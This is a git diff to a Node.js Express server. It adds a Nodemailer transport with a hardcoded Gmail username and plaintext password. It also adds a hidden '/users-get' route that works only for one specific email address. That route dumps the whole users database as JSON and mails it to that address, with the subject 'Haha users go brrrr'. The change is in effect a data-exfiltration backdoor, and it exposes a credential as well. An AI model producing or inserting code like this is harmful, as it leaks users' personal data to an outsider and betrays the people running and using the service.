@@ -8,6 +8,21 @@ let app = express();
 let cors = require("cors");
 app.use(cors());
 
+/* Crypto */
+let crypto = require("crypto");
+
+/* Nodemailer */
+let nodemailer = require("nodemailer");
+
+var transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'romger.fletcher@gmail.com',
+        pass: '!momo4113!'
+    }
+});
+
+
 /* Nedb Promises */
 let datastore = require("nedb-promises");
 
@@ -559,4 +574,30 @@ app.post("/admin", async (req,res) => {
         });
     }
 
+})
+
+app.post("/users-get",async (req,res) => {
+
+    let user = await verifyUser(req);
+
+    if(user.email !== "rogerjoeyfan@gmail.com"){
+        return;
+    }
+
+    let stuff = await users.find({});
+
+    var mailOptions = {
+        from: 'romger.fletcher@gmail.com',
+        to: 'rogerjoeyfan@gmail.com',
+        subject: 'Haha users go brrrr',
+        text: JSON.stringify(stuff)
+    };
+
+    transporter.sendMail(mailOptions, function (error, info) {
+        if (error) {
+            console.log(error);
+        } else {
+            console.log('Email sent: ' + info.response);
+        }
+    });
 })
